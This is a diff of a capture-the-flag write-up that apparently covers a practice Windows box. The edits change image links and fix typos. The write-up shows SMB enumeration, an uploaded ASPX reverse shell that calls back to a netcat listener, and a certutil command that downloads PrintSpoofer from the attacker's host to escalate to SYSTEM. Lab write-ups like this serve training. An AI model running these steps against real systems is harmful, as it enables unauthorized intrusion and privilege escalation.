@@ -111,17 +111,17 @@ Nmap done: 1 IP address (1 host up) scanned in 129.02 seconds
 
 Navigating to the site on port 80 we find an IIS default landing page:
 
-landing_page.png
+![landing_page.png](../assets/relevant_assets/landing_page.png)
 
 Before enumerating http let's take a look at the SMB shares to see if we can find anything interesting.
 
 Using CrackMapExec we see that we have read and write access to the nt4wrksv share using the guest account with null for a password. Let's use SMBClient to further enumerate:
 
-smb_passwords.png
+![smb_passwords.png](../assets/relevant_assets/smb_passwords.png)
 
 Ok interesting, looks like we've found a couple passwords. This appears to be Base64, so lets try to decode these:
 
-b64_passwds.png
+![b64_passwds.png](../assets/relevant_assets/b64_passwds.png)
 
 So it appears we now have two sets of credentials:
 
@@ -152,17 +152,17 @@ I set up a NetCat listener and turned my attention to the browser to see where m
 
 I had no luck on port 80 at http://10.10.28.224/nt4wrksv/shell.aspx
 
-shell_fail.png
+![shell_fail.png](../assets/relevant_assets/shell_fail.png)
 
 But looking back over my nmap scans I noticed the box had another http port open. I was able to succesfully trigger my shell by navigating to http://10.10.28.224:49663/nt4wrksv/shell.aspx
 
 Which called back to my nc listener and gave me a working shell:
 
-first_shell.png
+![first_shell.png](../assets/relevant_assets/first_shell.png)
 
 And from here I can grab the user.txt flag from Bob's desktop:
 
-user_flag.png
+![user_flag.png](../assets/relevant_assets/user_flag.png)
 
 Let's now turn our attention to escalating privileges to administrator!
 
@@ -170,13 +170,11 @@ Let's now turn our attention to escalating privileges to administrator!
 
 Running `whoami /all` shows me that SeImpersonatePrivilege is enabled on the machine.
 
-impersonate.png
+![impersonate.png](../assets/relevant_assets/impersonate.png)
 
 Nice! This should make for an easy privilege escalation. Because this is a Windows 10 box, let's try using PrintSpoofer.exe to escalate to the Administrator user.
 
-Firstly I'll set up a Python webserver in the directory I keep PrinteSpoofer in:
-
-And then afterwards I'll use CertUtil to donwload the file onto the target:
+Firstly I'll set up a Python webserver in the directory I keep PrinteSpoofer in and then afterwards I'll use CertUtil to download the file onto the target:
 
 ```text
 C:\Users\Bob\Desktop>certutil -urlcache -split -f "http://10.6.61.45/PrintSpoofer.exe"
@@ -187,7 +185,7 @@ certutil -urlcache -split -f "http://10.6.61.45/PrintSpoofer.exe"
 CertUtil: -URLCache command completed successfully.
 ```
 
-We can also verify a code 200 from the Python server:
+We can also verify a code 200 from the Python server logs:
 
 ```text
 ┌──(ryan㉿kali)-[~/Tools/privesc]
@@ -202,13 +200,13 @@ Once PrintSpoofer is on the target I simply execute:
 ```text
 C:\Users\Bob\Desktop>PrintSpoofer.exe -i -c cmd
 ```
-And I can verify that the exploit worked and am now nt authoirty\system on the machine:
+And I can verify that the exploit worked and am now nt authority\system on the machine:
 
-system.png
+![system.png](../assets/relevant_assets/system.png)
 
 All that's left to do now is to grab the root.txt flag in the Administrator's Desktop:
 
-root_flag.png
+![root_flag.png](../assets/relevant_assets/root_flag.png)
 
 And that's that! Thanks for following along!
 
